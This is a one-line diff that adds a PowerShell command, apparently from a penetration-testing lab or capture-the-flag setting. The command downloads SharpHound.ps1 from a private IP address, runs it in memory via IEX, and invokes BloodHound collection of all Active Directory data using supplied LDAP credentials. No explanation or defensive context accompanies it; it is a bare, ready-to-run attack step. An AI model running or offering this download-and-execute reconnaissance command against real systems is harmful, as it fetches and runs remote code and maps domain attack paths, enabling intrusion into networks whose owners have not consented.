@@ -1,0 +1,2 @@
+powershell -command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.107/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All -LDAPUser username -LDAPPass user_password"
+
